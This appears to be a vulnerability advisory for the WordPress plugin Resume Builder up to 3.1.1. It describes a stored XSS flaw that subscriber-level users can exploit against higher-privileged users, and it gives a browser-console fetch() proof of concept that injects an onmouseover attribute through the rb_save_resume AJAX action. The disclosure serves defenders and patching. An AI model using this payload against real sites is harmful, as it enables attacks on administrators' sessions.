## WordPress Plugin Vulnerabilities

# Resume Builder <= 3.1.1 - Subscriber+ Stored XSS

### Description

The plugin does not sanitize and escape some parameters related to Resume, which could allow users with a role as low as subscriber to perform Stored XSS attacks against higher privilege users

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as subscriber user
fetch('/wp-admin/admin-ajax.php', {
method: 'POST',
headers: new Headers({
'Content-Type': 'application/x-www-form-urlencoded',
}),
body: 'action=rb\_save\_resume&resume\_id=undefined&resume\_data={"name":"XSS","featured\_image":false,"featured\_image\_url":false,"resume\_file":false,"introduction":{"subtitle":"XSS","content":"<p></p>"},"contact":{"email":"","phone":"","website":"","address":""},"experience":[],"skills":[],"display":{"template":"default\\" onmouseover=\\"alert(1)\\"","text\_color":"#000000","highlight\_color":"#2271b1","star\_color":"#ffA500","wrapper\_style":"full","max\_width":"100","max\_width\_type":"percent","padding":"0","container\_bg":"#ffffff","container\_shadow":"false","container\_border\_radius":"0","sidebar\_position":"left","rating\_stars":"show","photo\_size":"100","attachment\_button\_text":"Download Attachment"}}'
}).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));
